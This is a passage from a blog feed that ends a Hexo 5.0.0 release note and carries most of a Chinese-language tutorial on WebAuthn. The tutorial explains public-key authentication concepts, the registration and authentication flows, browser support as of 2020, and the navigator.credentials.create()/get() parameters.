配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 